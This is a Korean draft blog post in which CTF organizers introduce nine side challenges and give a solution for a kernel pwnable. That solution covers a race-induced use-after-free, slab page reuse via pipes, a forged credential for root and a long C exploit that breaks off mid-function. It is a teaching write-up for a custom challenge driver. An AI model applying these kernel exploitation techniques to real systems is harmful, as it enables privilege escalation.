---
title: "방탈출 CTF 운영기 3편: 추가 의뢰"
description: "방탈출 CTF의 추가 의뢰 9개를 독립형 문제로 구성한 배경과 문제별 분석 원리, 재현 가능한 풀이를 소개합니다."
author: roomescape_ctf_pending
# 작성자와 게시일은 미정입니다. 확정 후 _posts로 이동합니다.
tags: [Tech, CTF, roomescape]
categories: [Tech, CTF]
comments: false
math: false
mermaid: false
pin: false
toc: false
image: # 게시용 가로 썸네일 미정
---

## 목차

1. [추가 의뢰](#1-추가-의뢰)
2. [의뢰별 풀이](#2-의뢰별-풀이)
   1. [000번 보관함의 승인서를 가져와 주세요](#21-000번-보관함의-승인서를-가져와-주세요)
   2. [봇들 사이에 도는 소문의 출처를 찾아 주세요](#22-봇들-사이에-도는-소문의-출처를-찾아-주세요)
   3. [폐기하기 전에 보관소부터 열어 주십시오](#23-폐기하기-전에-보관소부터-열어-주십시오)
   4. [폐기 단말에 남은 실행 기록을 복구해 주세요](#24-폐기-단말에-남은-실행-기록을-복구해-주세요)
   5. [응답 없는 센서 세 대를 다시 연결해 주세요](#25-응답-없는-센서-세-대를-다시-연결해-주세요)
   6. [금고가 열린 순간의 영상을 찾아 주세요](#26-금고가-열린-순간의-영상을-찾아-주세요)
   7. [고양이는 자고 있었는데 참치는 누가 먹었죠?](#27-고양이는-자고-있었는데-참치는-누가-먹었죠)
   8. [키는 사라졌지만, 흔적은 남아 있을까요?](#28-키는-사라졌지만-흔적은-남아-있을까요)
   9. [나를 쫓아낸 회사의 진짜 복구 기록을 가져오세요](#29-나를-쫓아낸-회사의-진짜-복구-기록을-가져오세요)
3. [마치며](#3-마치며)

## 1. 추가 의뢰

### 1.1 메인 시나리오와의 관계

추가 의뢰는 현장 조사 중심의 메인 시나리오와 별도로 제공한 독립형 Jeopardy 문제입니다. 메인 시나리오의 방 순서나 진행 단계와 연결되지 않아 참가자는 대회 플랫폼에서 원하는 의뢰를 골라 순서와 관계없이 해결할 수 있었습니다. 추가 의뢰를 풀지 않아도 메인 시나리오를 계속 진행할 수 있었으며, 획득한 점수는 전체 순위에 합산했습니다.

현장 조사와 별도 분석 공간의 문제 풀이를 병행할 수 있도록 마련한 구성입니다. 메인 시나리오가 현장의 문서·사물·디지털 자료를 연결해 사건을 조사하는 방식이라면, 추가 의뢰는 각기 다른 사건의 의뢰서를 바탕으로 제공 파일이나 원격 서비스에서 필요한 정보를 찾아 해결하는 방식으로 진행했습니다.

### 1.2 의뢰서 형식

각 문제는 단순한 분야명과 정답 조건만 제시하지 않고, `의뢰 이름`, `의뢰인`, `의뢰 내용`으로 이루어진 의뢰서 형식을 사용했습니다. 의뢰인은 복구가 필요한 기록이나 조사할 장비, 확인해야 할 사건을 설명하고, 참가자는 첨부 파일 또는 원격 서비스를 분석해 의뢰를 완료합니다. 문제마다 의뢰인의 말투와 사건 배경은 달리하되, 다음 정보는 의뢰문과 대회 플랫폼 화면에서 분명히 확인할 수 있도록 구성했습니다.

- 무엇을 조사해야 하는지
- 어떤 파일 또는 원격 서비스가 제공되는지
- 최종적으로 어떤 결과를 복구하거나 증명해야 하는지
- 인증 토큰이나 접속 방식 등 풀이 시작에 필요한 정보

문제 설명이 기술적인 지시만 나열하는 문서가 되지 않도록, 분석 대상과 요청 배경을 하나의 사건으로 전달했습니다. 동시에 서사 때문에 풀이 목표가 모호해지지 않도록 조사 대상, 제공 자료와 최종 요청 사항은 의뢰문에서 분명히 확인할 수 있게 했습니다.

### 1.3 문제 구성과 난이도

추가 의뢰는 Web, Pwnable, Reversing, Crypto, Forensics, AI / Misc 분야로 구성했습니다. 대부분은 처음 기술 문제를 접한 참가자도 제공 자료와 의뢰문을 따라 시도할 수 있도록 낮은 난이도로 설계했습니다. 여기에 VM 내부 구조나 커널 객체 수명처럼 깊은 분석이 필요한 문제를 일부 배치해 숙련된 참가자도 도전할 수 있도록 했습니다.

정적 파일만 분석하는 문제와 원격 서비스의 상태를 변화시키는 문제를 함께 배치했습니다. 팀별 진행 상태가 필요한 서비스는 대회 플랫폼의 개인 계정에서 발급한 Access Token으로 소속 팀을 확인해 세션, 요청 예산과 중간 상태를 분리했습니다. 같은 팀의 팀원은 하나의 진행 기록을 공유하되 다른 팀의 측정값이나 풀이 상태에는 접근할 수 없도록 구성했습니다.

![대회 플랫폼의 추가 의뢰 목록](/assets/img/room-escape-ctf/extra-requests/ctfd-additional-requests-list.png)

*그림 1. 대회 플랫폼에서 제공한 추가 의뢰 목록.*
{: .text-center }

| 의뢰 제목 | 분야 | 난이도 |
|---|---|---|
| 000번 보관함의 승인서를 가져와 주세요 | Pwnable | 상 |
| 봇들 사이에 도는 소문의 출처를 찾아 주세요 | AI / Misc | 하 |
| 폐기하기 전에 보관소부터 열어 주십시오 | Crypto / Pwnable | 하 |
| 폐기 단말에 남은 실행 기록을 복구해 주세요 | Pwnable | 중 |
| 응답 없는 센서 세 대를 다시 연결해 주세요 | Reversing | 하 |
| 금고가 열린 순간의 영상을 찾아 주세요 | Reversing | 중 |
| 고양이는 자고 있었는데 참치는 누가 먹었죠? | Web | 하 |
| 키는 사라졌지만, 흔적은 남아 있을까요? | Misc / Forensics | 중 |
| 나를 쫓아낸 회사의 진짜 복구 기록을 가져오세요 | Web | 하 |

난이도는 출제 의도와 요구되는 분석 범위를 기준으로 `상`, `중`, `하`로 표기했습니다.

## 2. 의뢰별 풀이

### 2.1 000번 보관함의 승인서를 가져와 주세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | `KERN3L_P4N!C` |
| 분야 | Pwnable / Linux Kernel |
| 난이도 | 상 |
| 제공 파일 | `reclaim-box-000-player.tar.gz` |
| 실행 환경 | Linux 6.12.103 x86-64 / QEMU, KASLR·PTI·SMEP·SMAP 적용 |
| 참가자 권한 | uid 1000 BusyBox shell |
| 핵심 원리 | last-owner race로 만든 dangling reference와 커널 객체 재할당 |
| 목표 | last-owner race를 이용해 루트 권한 또는 approval HMAC 키 획득 |
| 플래그 | `SHA{9a73f71c816d7bae202fd5a6c175ace1}` |

![대회 플랫폼의 000번 보관함 승인서 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-reclaim-challenge.png)

*그림 2. 000번 보관함의 승인서 의뢰 화면.*
{: .text-center }

의뢰인은 정산 분쟁으로 폐기 대상이 된 000번 보관함에서 승인서 원본을 꺼내기 위해, 서버에 남아 있는 비밀키를 회수해 달라고 요청합니다. 참가자는 uid 1000 BusyBox 환경에서 다음 세 장치를 조사합니다.

```text
/dev/reclaim
/dev/reclaim-ledger
/dev/reclaim-codec
```

압축을 풀고 다음과 같이 로컬 QEMU 환경을 실행할 수 있습니다.

```bash
sha256sum reclaim-box-000-player.tar.gz
mkdir player
tar -xzf reclaim-box-000-player.tar.gz -C player
cd player
./run.sh
```

원격에서는 대회 플랫폼의 개인 Access Token으로 소속 팀을 확인한 뒤 팀별 일회성 VM을 할당했습니다. VM 제한 시간은 900초이며 연결을 끊으면 이전 객체 상태가 없는 새 VM이 만들어집니다. 따라서 익스플로잇은 한 세션에서 끝내야 합니다.

이 문제에는 공통된 last-owner race에서 출발하는 두 풀이 경로가 있습니다.

| 경로 | 핵심 객체 | 최종 목표 |
|---|---|---|
| 풀이 1 | Linux `struct key`, pipe page, forged credential | 루트 권한 획득 후 보관함 직접 탐색 |
| 풀이 2 | archive cursor, xattr, inotify event | 서명 키 복구 후 approval gate 통과 |

#### 1. last-owner race 구성

case resource는 native object reference 하나를 소유합니다. `PUBLISH`가 reviewer list를 순회하면서 현재 reviewer를 마지막 항목으로 판단하면 새 reference를 얻지 않고 원래 reference를 receipt에 넘깁니다. 그러나 정책 평가가 진행되는 동안 다른 CPU가 reviewer를 tail에 추가할 수 있습니다.

```text
CPU 0: reviewer 두 명이 연결된 case를 PUBLISH
CPU 0: 기존 tail이 자신을 마지막 reviewer로 판단
CPU 1: reviewer를 새 tail로 추가
CPU 0: 두 receipt가 모두 원래 native reference를 받음
결과 : receipt 수가 실제 reference budget보다 1개 많아짐
```

모든 receipt를 닫았을 때 race가 실패했다면 refcount가 정상적으로 0이 되어 안전하게 다시 시도할 수 있습니다. 성공하면 receipt 하나만 남겨도 해제된 native object를 계속 가리키게 됩니다. 이 공통 공격 기반에서 두 풀이 경로가 갈라집니다.

#### 2. 풀이 1 - key slab page를 pipe page로 회수

풀이 1은 signed statement backend의 실제 owner가 Linux `struct key`라는 점을 이용합니다. mixed ledger를 정상 API로 열거하고 envelope의 generation, digest와 checksum을 검사해 statement 객체를 찾은 뒤, 같은 storage group에 속한 key를 정리합니다.

목표는 단순히 key 객체를 많이 해제하는 것이 아닙니다. 특정 `key_jar` slab page에서 모든 live object를 없애고 CPU slab, CPU partial과 node partial을 거쳐 해당 page가 buddy allocator로 반환되게 해야 합니다. 반환된 동일 물리 페이지를 anonymous pipe의 backing page로 다시 할당받습니다.

pipe에 공격자가 구성한 데이터를 쓰면 dangling receipt가 같은 위치를 과거의 `struct key`로 해석합니다. 가짜 key의 `type`을 실제 `key_type_big_key`로, payload를 읽고 싶은 커널 주소로 맞추면 정상 key read consumer를 통해 제한된 커널 arbitrary read를 얻을 수 있습니다.

codec이 제공하는 독립적인 core pointer와 공개 offset delta로 다음 주소를 복원합니다.

```text
KASLR base
init_task / init_cred
key_type_big_key
vmemmap_base / page_offset_base
```

task list에서 현재 PID를 찾은 뒤 `task → cred → files → fdtable → pipe_inode_info → pipe_buffer`를 따라 현재 task와 pipe page의 direct-map 주소를 얻습니다. 같은 pipe page에 가짜 `struct key`, late callback을 가진 가짜 `key_type`과 root capability를 가진 `cred`를 함께 배치합니다. `RECLAIM_RECEIPT_IOC_APPLY`가 late method를 호출하면 현재 task의 credential pointer가 가짜 cred로 바뀝니다.

uid와 euid가 0인지 확인한 뒤 `/root/quarantine/000`의 객체를 정상 `open/read` syscall로 조사해 플래그를 찾습니다.

#### 3. 풀이 2 - archive cursor UAF 만들기

풀이 2는 approval key를 직접 복구합니다. 플래그가 있는 evidence는 일반 사용자가 열 수 없으며, setuid `reclaim-approval`은 매 실행마다 32바이트 nonce를 발급하고 올바른 HMAC-SHA256 응답이 제출될 때만 evidence를 출력합니다.

case에 reviewer 둘을 연결한 뒤 한 스레드가 publish하는 동안 다른 스레드가 마지막 receipt를 닫으면 archive cursor가 해제된 뒤에도 desk 쪽 cursor 참조가 남습니다.

race는 주소 누출 하나만으로 판정하지 않습니다. stale receipt를 정상 API로 읽었을 때 예상 generation과 locator 형태가 함께 관찰되는 경우에만 다음 단계로 진행합니다. 실패한 round는 객체를 정리하고 제한된 횟수 안에서 새 case로 다시 시도합니다.

#### 4. 무작위 frame의 역할 구분

ledger의 `BOOKMARK`와 `SNAPSHOT`은 동일한 fingerprint에 대해 네 개의 216바이트 frame을 만들지만 역할은 매번 섞입니다. 해제된 cursor와 실제로 같은 `kmalloc-cg-256` 슬롯을 공유하는 frame을 찾은 뒤 서로 다른 두 커널 객체로 슬롯을 재점유합니다.

- ordering lane: tmpfs `simple_xattr` 객체로 재점유한 뒤 `APPLY`
- redaction lane: inotify event 객체로 재점유한 뒤 `RECONCILE`

ordering lane에서는 xattr value 앞부분을 stale rbtree node 형태로 구성합니다. header, name 길이와 parent provenance가 맞으면 `APPLY`가 target anchor의 tree edge를 제거합니다. redaction lane에서는 queued inotify event의 header와 name payload를 맞춰 `RECONCILE`이 target fingerprint의 lease를 제거하게 합니다.

#### 5. 두 변조를 결합해 signing key 복구

ordering lane만 성공하면 lease가 남고, redaction lane만 성공하면 tree reachability가 남습니다. 또한 서로 다른 fingerprint에 두 변조를 적용하면 provenance 검사를 통과하지 못합니다. 같은 fingerprint의 tree edge와 lease를 모두 제거해야 serializer가 32바이트 signing key 후보를 반환합니다.

복구한 후보로 nonce의 HMAC을 계산해 approval gate에 제출하면 root-only evidence에서 플래그가 출력됩니다.

```text
nonce = reclaim-approval이 발급한 32바이트 값
response = HMAC-SHA256(recovered_signing_key, nonce)
```

익스플로잇은 stale receipt를 만들고, 같은 fingerprint에 ordering lane과 redaction lane을 차례로 적용한 뒤 복구 후보를 approval gate에 제출합니다. gate가 `MAC:SHA{...}` 형식의 응답을 반환한 후보만 정답으로 처리합니다.

#### 6. 익스플로잇


```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#include <linux/ioctl.h>
#include <linux/types.h>

#define RECLAIM_CASE_PATH "/dev/reclaim"
#define RECLAIM_LEDGER_PATH "/dev/reclaim-ledger"
#define RECLAIM_EVIDENCE_PATH "/dev/reclaim-evidence"
#define RECLAIM_MAX_RECEIPTS 16U
#define RECLAIM_MAX_POLICY_SIZE (8U * 1024U * 1024U)
#define RECLAIM_MAX_LEDGER_RECORDS 4096U
#define RECLAIM_ARCHIVE_ANCHORS 15U
#define RECLAIM_ARCHIVE_XATTR_VALUE 176U
#define RECLAIM_ARCHIVE_NOTIFY_NAME 183U
#define RECLAIM_ARCHIVE_EVENT_TAG UINT64_C(0x6c65617365763421)

struct reclaim_reviewer { __u32 policy_size, policy_rounds; __u64 seed; __u32 reviewer_id, reserved; };
struct reclaim_attach { __u64 token; };
struct reclaim_publish { __u64 receipt_fds; __u32 capacity, count; __u64 digest; };
struct reclaim_view { __u64 buffer; __u32 capacity; __s32 result; };
struct reclaim_generation { __u64 generation; __u32 count, reserved; };
struct reclaim_ledger_record { __u32 index, reserved; __u64 token, fingerprint; };
struct reclaim_token_request { __u64 token; };
struct reclaim_archive_bookmark { __u64 marker, token; };
struct reclaim_archive_snapshot { __u64 fingerprint, revision; __u32 frame_count, reserved; };
struct reclaim_archive_description { __u64 generation, locator; };
struct reclaim_archive_event_descriptor { __u64 generation, locator, tag, checksum; };
struct reclaim_archive_export_record { __u64 fingerprint; __u32 length, reserved; __u8 data[32]; };

#define RECLAIM_CASE_IOC_MAGIC 0xa4
#define RECLAIM_CASE_IOC_ADD_REVIEWER _IOWR(RECLAIM_CASE_IOC_MAGIC, 0x01, struct reclaim_reviewer)
#define RECLAIM_CASE_IOC_ATTACH _IOW(RECLAIM_CASE_IOC_MAGIC, 0x02, struct reclaim_attach)
#define RECLAIM_CASE_IOC_PUBLISH _IOWR(RECLAIM_CASE_IOC_MAGIC, 0x03, struct reclaim_publish)
#define RECLAIM_RECEIPT_IOC_VIEW _IOWR(RECLAIM_CASE_IOC_MAGIC, 0x20, struct reclaim_view)
#define RECLAIM_RECEIPT_IOC_APPLY _IO(RECLAIM_CASE_IOC_MAGIC, 0x21)
#define RECLAIM_RECEIPT_IOC_RECONCILE _IO(RECLAIM_CASE_IOC_MAGIC, 0x22)
#define RECLAIM_RECEIPT_IOC_DISARM _IO(RECLAIM_CASE_IOC_MAGIC, 0x23)
#define RECLAIM_LEDGER_IOC_MAGIC 0xa5
#define RECLAIM_LEDGER_IOC_SYNC _IOWR(RECLAIM_LEDGER_IOC_MAGIC, 0x01, struct reclaim_generation)
#define RECLAIM_LEDGER_IOC_READ _IOWR(RECLAIM_LEDGER_IOC_MAGIC, 0x02, struct reclaim_ledger_record)
#define RECLAIM_LEDGER_IOC_WITHDRAW _IOW(RECLAIM_LEDGER_IOC_MAGIC, 0x07, struct reclaim_token_request)
#define RECLAIM_LEDGER_IOC_BOOKMARK _IOWR(RECLAIM_LEDGER_IOC_MAGIC, 0x08, struct reclaim_archive_bookmark)
#define RECLAIM_LEDGER_IOC_SNAPSHOT _IOWR(RECLAIM_LEDGER_IOC_MAGIC, 0x09, struct reclaim_archive_snapshot)

#define POLICY_SIZE RECLAIM_MAX_POLICY_SIZE
#define POLICY_ROUNDS 4U
#define LANE_ATTEMPTS 96U

struct publish_thread {
	int fd;
	atomic_int started;
	int result;
	int receipts[RECLAIM_MAX_RECEIPTS];
	struct reclaim_publish request;
};

struct stale_round {
	int case_fd;
	int receipt;
	struct reclaim_archive_description live;
};

struct frame_batch {
	uint64_t tokens[4];
	struct reclaim_archive_description views[4];
	unsigned int count;
	int overlap;
};

struct notify_fixture {
	char directory[64];
	char name[RECLAIM_ARCHIVE_NOTIFY_NAME + 1];
	char path[320];
	struct reclaim_archive_event_descriptor descriptor;
	int fd;
	int wd;
};

static unsigned int round_serial;

static void fail(const char *message)
{
	perror(message);
	exit(EXIT_FAILURE);
}

static void pin_cpu(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		fail("sched_setaffinity E");
}

static uint64_t rotate_left(uint64_t value, unsigned int amount)
{
	return (value << amount) | (value >> (64 - amount));
}

static uint64_t event_checksum(
	const struct reclaim_archive_event_descriptor *descriptor)
{
	return descriptor->generation ^ rotate_left(descriptor->locator, 19) ^
		rotate_left(descriptor->tag, 41) ^
		UINT64_C(0xd6e8feb86659fd93);
}

static void add_reviewer(int fd, uint64_t seed)
{
	struct reclaim_reviewer request = {
		.policy_size = POLICY_SIZE,
		.policy_rounds = POLICY_ROUNDS,
		.seed = seed,
	};

	if (ioctl(fd, RECLAIM_CASE_IOC_ADD_REVIEWER, &request) != 0)
		fail("add E reviewer");
}

static void *publish_on_cpu0(void *opaque)
{
	struct publish_thread *thread = opaque;

	pin_cpu(0);
	memset(thread->receipts, -1, sizeof(thread->receipts));
	thread->request.receipt_fds = (uintptr_t)thread->receipts;
	thread->request.capacity = RECLAIM_MAX_RECEIPTS;
	atomic_store_explicit(&thread->started, 1, memory_order_release);
	thread->result = ioctl(thread->fd, RECLAIM_CASE_IOC_PUBLISH,
			       &thread->request);
	return NULL;
}

static int receipt_view(int fd, struct reclaim_archive_description *description)
{
	struct reclaim_view request = {
		.buffer = (uintptr_t)description,
		.capacity = sizeof(*description),
		.result = -1,
	};

	memset(description, 0, sizeof(*description));
	if (ioctl(fd, RECLAIM_RECEIPT_IOC_VIEW, &request) != 0)
		return -errno;
	return request.result;
}

static int one_receipt(uint64_t token)
{
	struct reclaim_publish publish = { };
	struct reclaim_attach attach = { .token = token };
	int receipts[RECLAIM_MAX_RECEIPTS];
	int fd;

	fd = open(RECLAIM_CASE_PATH, O_RDWR | O_CLOEXEC);
	if (fd < 0)
		fail("open normal archive case");
	add_reviewer(fd, UINT64_C(0x243f6a8885a308d3));
	if (ioctl(fd, RECLAIM_CASE_IOC_ATTACH, &attach) != 0)
		fail("attach normal archive record");
	memset(receipts, -1, sizeof(receipts));
	publish.receipt_fds = (uintptr_t)receipts;
	publish.capacity = RECLAIM_MAX_RECEIPTS;
	if (ioctl(fd, RECLAIM_CASE_IOC_PUBLISH, &publish) != 0 ||
	    publish.count != 1)
		fail("publish normal archive record");
	close(fd);
	return receipts[0];
}

static void disarm_close(int fd)
{
	if (ioctl(fd, RECLAIM_RECEIPT_IOC_DISARM) != 0)
		fail("disarm E receipt");
	close(fd);
}

static void require_catalog_native_reject(int receipt)
{
	errno = 0;
	if (ioctl(receipt, RECLAIM_RECEIPT_IOC_APPLY) == 0 ||
	    errno != EPROTOTYPE)
		fail("catalog entered ordering consumer");
	errno = 0;
	if (ioctl(receipt, RECLAIM_RECEIPT_IOC_RECONCILE) == 0 ||
	    errno != EPROTOTYPE)
		fail("catalog entered lease consumer");
}

static int begin_stale_round(int ledger_fd, struct stale_round *round,
			     uint64_t marker)
{
	struct reclaim_archive_bookmark bookmark = { .marker = marker };
	struct reclaim_token_request withdraw;
	struct reclaim_attach attach;
	struct publish_thread publish = { };
	pthread_t worker;

	memset(round, 0, sizeof(*round));
	round->case_fd = -1;
	round->receipt = -1;
	if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_BOOKMARK, &bookmark) != 0)
		fail("append mixed ledger bookmark");
	round->live.generation = 0; /* filled by caller after SYNC comparison */
	round->live.locator = marker;
	round->case_fd = open(RECLAIM_CASE_PATH, O_RDWR | O_CLOEXEC);
	if (round->case_fd < 0)
		fail("open E case desk");
	add_reviewer(round->case_fd,
		     UINT64_C(0x6a09e667f3bcc909) ^ marker);
	attach.token = bookmark.token;
	if (ioctl(round->case_fd, RECLAIM_CASE_IOC_ATTACH, &attach) != 0)
		fail("attach mixed archive cursor");
	publish.fd = round->case_fd;
	atomic_init(&publish.started, 0);
	if (pthread_create(&worker, NULL, publish_on_cpu0, &publish) != 0)
		fail("pthread_create E publish");
	while (!atomic_load_explicit(&publish.started, memory_order_acquire))
		sched_yield();
	pin_cpu(1);
	usleep(2000);
	add_reviewer(round->case_fd,
		     UINT64_C(0xbb67ae8584caa73b) ^ marker);
	if (pthread_join(worker, NULL) != 0)
		fail("pthread_join E publish");
	if (publish.result != 0 || publish.request.count != 2) {
		fprintf(stderr, "archive publish produced result=%d count=%u\n",
			publish.result, publish.request.count);
		exit(EXIT_FAILURE);
	}
	withdraw.token = bookmark.token;
	if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_WITHDRAW, &withdraw) != 0)
		fail("withdraw mixed ledger bookmark");
	close(publish.receipts[0]);
	round->receipt = publish.receipts[1];
	return 0;
}

static unsigned int ledger_slot_count(int ledger_fd)
{
	unsigned int index;

	for (index = 0; index < RECLAIM_MAX_LEDGER_RECORDS; index++) {
		struct reclaim_ledger_record record = { .index = index };

		errno = 0;
		if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_READ, &record) != 0) {
			if (errno == ERANGE)
				return index;
			fail("count mixed ledger slots");
		}
	}
	fail("mixed ledger slot bound");
	return 0;
}

/*
 * A normal snapshot emits two opaque views in random order.  Neither the
 * ioctl result nor an ordinary receipt discloses which native consumer owns a
 * view.  The stale bookmark can identify only the one physical replacement.
 */
static int snapshot_frame(int ledger_fd, struct stale_round *round,
			  uint64_t fingerprint, uint64_t revision,
			  struct frame_batch *batch,
			  struct reclaim_archive_description *description)
{
	struct reclaim_archive_snapshot snapshot = {
		.fingerprint = fingerprint,
		.revision = revision,
	};
	unsigned int base, i;
	int result;

	memset(batch, 0, sizeof(*batch));
	batch->overlap = -1;
	base = ledger_slot_count(ledger_fd);
	if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_SNAPSHOT, &snapshot) != 0)
		fail("materialize mixed ledger snapshot");
	if (!snapshot.frame_count ||
	    snapshot.frame_count > sizeof(batch->tokens) / sizeof(batch->tokens[0]))
		fail("snapshot frame count");
	batch->count = snapshot.frame_count;
	for (i = 0; i < batch->count; i++) {
		struct reclaim_ledger_record record = { .index = base + i };
		int receipt;

		if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_READ, &record) != 0 ||
		    !record.token)
			fail("read snapshot frame ledger slot");
		batch->tokens[i] = record.token;
		receipt = one_receipt(record.token);
		if (receipt_view(receipt, &batch->views[i]) !=
		    (int)sizeof(batch->views[i]) ||
		    !batch->views[i].generation || batch->views[i].locator)
			fail("ordinary snapshot frame redaction");
		close(receipt);
	}
	result = receipt_view(round->receipt, description);
	for (i = 0; i < batch->count; i++)
		if (result == (int)sizeof(*description) &&
		    description->generation == batch->views[i].generation &&
		    description->locator) {
			batch->overlap = (int)i;
			return 1;
		}
	if (result == (int)sizeof(*description) &&
	    description->locator == round->live.locator)
		return 0;
	return -1;
}

static void withdraw_frame(int ledger_fd, uint64_t token)
{
	struct reclaim_token_request withdraw = { .token = token };

	if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_WITHDRAW, &withdraw) != 0)
		fail("withdraw snapshot frame");
}

static void withdraw_other_frames(int ledger_fd, struct frame_batch *batch)
{
	unsigned int i;

	for (i = 0; i < batch->count; i++) {
		if ((int)i == batch->overlap || !batch->tokens[i])
			continue;
		withdraw_frame(ledger_fd, batch->tokens[i]);
		batch->tokens[i] = 0;
	}
}

static void finish_unmutated_round(int ledger_fd, struct stale_round *round,
				   struct frame_batch *batch, int safe_miss)
{
	unsigned int i;

	for (i = 0; i < batch->count; i++)
		if (batch->tokens[i]) {
			withdraw_frame(ledger_fd, batch->tokens[i]);
			batch->tokens[i] = 0;
		}
	if (safe_miss)
		close(round->receipt);
	else
		disarm_close(round->receipt);
	close(round->case_fd);
}

static int one_order_attempt(int ledger_fd, uint64_t fingerprint,
			     unsigned int attempt)
{
	struct reclaim_archive_description description, observed;
	struct frame_batch batch;
	struct stale_round round;
	unsigned char value[RECLAIM_ARCHIVE_XATTR_VALUE] = { };
	unsigned char readback[RECLAIM_ARCHIVE_XATTR_VALUE];
	char path[] = "/tmp/release-e-xattr-XXXXXX";
	char name[48];
	uint64_t marker, revision;
	int fd, placement, mutation, mutation_errno = 0;

	marker = UINT64_C(0x5800000000000000) ^
		((uint64_t)++round_serial << 16) ^ attempt ^ fingerprint;
	revision = marker ^ UINT64_C(0x7265766973696f6e);
	if (!revision)
		revision = 1;
	fd = mkstemp(path);
	if (fd < 0)
		fail("mkstemp E xattr");
	snprintf(name, sizeof(name), "user.audit-%08x-%u",
		 (unsigned int)fingerprint, attempt);
	begin_stale_round(ledger_fd, &round, marker);
	placement = snapshot_frame(ledger_fd, &round, fingerprint, revision, &batch,
				   &description);
	if (placement < 0) {
		fprintf(stderr, "snapshot had neither bookmark nor frame identity\n");
		exit(EXIT_FAILURE);
	}
	if (placement != 1) {
		finish_unmutated_round(ledger_fd, &round, &batch,
				       placement == 0);
		close(fd);
		unlink(path);
		return 0;
	}
	require_catalog_native_reject(round.receipt);
	withdraw_frame(ledger_fd, batch.tokens[batch.overlap]);
	batch.tokens[batch.overlap] = 0;
	memcpy(value + 32, &description, sizeof(description));
	if (fsetxattr(fd, name, value, sizeof(value), XATTR_CREATE) != 0)
		fail("create snapshot xattr");
	if (receipt_view(round.receipt, &observed) != (int)sizeof(observed) ||
	    memcmp(&observed, &description, sizeof(observed))) {
		disarm_close(round.receipt);
		close(round.case_fd);
		if (fremovexattr(fd, name) != 0)
			fail("remove missed snapshot xattr");
		withdraw_other_frames(ledger_fd, &batch);
		close(fd);
		unlink(path);
		return 0;
	}
	errno = 0;
	if (ioctl(round.receipt, RECLAIM_RECEIPT_IOC_RECONCILE) == 0 ||
	    errno != EPROTOTYPE) {
		fprintf(stderr, "xattr crossed native consumer boundary errno=%d\n",
			errno);
		exit(EXIT_FAILURE);
	}
	errno = 0;
	mutation = ioctl(round.receipt, RECLAIM_RECEIPT_IOC_APPLY);
	if (mutation != 0) {
		mutation_errno = errno;
		if (mutation_errno != EKEYREJECTED && mutation_errno != EPERM &&
		    mutation_errno != EPROTOTYPE)
			fail("apply snapshot xattr mutation");
	}
	disarm_close(round.receipt);
	close(round.case_fd);
	memset(readback, 0, sizeof(readback));
	if (fgetxattr(fd, name, readback, sizeof(readback)) !=
	    (ssize_t)sizeof(readback) ||
	    memcmp(readback + 32, value + 32, sizeof(value) - 32)) {
		fprintf(stderr, "normal xattr lifecycle changed after snapshot mutation\n");
		exit(EXIT_FAILURE);
	}
	if (fremovexattr(fd, name) != 0)
		fail("remove snapshot xattr");
	withdraw_other_frames(ledger_fd, &batch);
	close(fd);
	unlink(path);
	if (mutation == 0)
		return 1;
	return mutation_errno == EPERM ? -1 : 0;
}

static int apply_order_lane(int ledger_fd, uint64_t fingerprint)
{
	unsigned int attempt;

	for (attempt = 1; attempt <= LANE_ATTEMPTS; attempt++) {
		int result = one_order_attempt(ledger_fd, fingerprint, attempt);

		if (result > 0) {
			printf("[RELEASE-E-ORDER-LANE-PASS] attempts=%u\n", attempt);
			return 1;
		}
		if (result < 0)
			return 0;
	}
	return 0;
}

static void build_notify_fixture(struct notify_fixture *fixture,
				 uint64_t generation)
{
	unsigned int i;
	int file_fd;

	memset(fixture, 0, sizeof(*fixture));
	fixture->fd = -1;
	fixture->wd = -1;
	fixture->descriptor.generation = generation;
	fixture->descriptor.locator = 0;
	fixture->descriptor.tag = RECLAIM_ARCHIVE_EVENT_TAG;
	fixture->descriptor.checksum = event_checksum(&fixture->descriptor);
	if (snprintf(fixture->name, 65, "%016llx%016llx%016llx%016llx",
		     (unsigned long long)fixture->descriptor.generation,
		     (unsigned long long)fixture->descriptor.locator,
		     (unsigned long long)fixture->descriptor.tag,
		     (unsigned long long)fixture->descriptor.checksum) != 64)
		fail("format lease event name");
	for (i = 64; i < RECLAIM_ARCHIVE_NOTIFY_NAME; i++)
		fixture->name[i] = 'g' + ((i + generation) % 14);
	fixture->name[RECLAIM_ARCHIVE_NOTIFY_NAME] = '\0';
	snprintf(fixture->directory, sizeof(fixture->directory),
		 "/tmp/release-e-notify-%u", ++round_serial);
	if (mkdir(fixture->directory, 0700) != 0 && errno != EEXIST)
		fail("mkdir E notify");
	snprintf(fixture->path, sizeof(fixture->path), "%s/%s",
		 fixture->directory, fixture->name);
	unlink(fixture->path);
	file_fd = open(fixture->path,
		       O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC, 0600);
	if (file_fd < 0)
		fail("create E notify file");
	close(file_fd);
	fixture->fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
	if (fixture->fd < 0)
		fail("inotify_init E");
	fixture->wd = inotify_add_watch(fixture->fd, fixture->directory,
					IN_ATTRIB);
	if (fixture->wd < 0)
		fail("inotify_add_watch E");
}

static void cleanup_notify_fixture(struct notify_fixture *fixture)
{
	if (fixture->wd >= 0)
		inotify_rm_watch(fixture->fd, fixture->wd);
	if (fixture->fd >= 0)
		close(fixture->fd);
	unlink(fixture->path);
	rmdir(fixture->directory);
}

static int one_notify_attempt(int ledger_fd, uint64_t fingerprint,
			      unsigned int attempt)
{
	struct reclaim_archive_description description;
	struct frame_batch batch;
	struct notify_fixture fixture;
	struct stale_round round;
	struct inotify_event *event;
	unsigned char buffer[512];
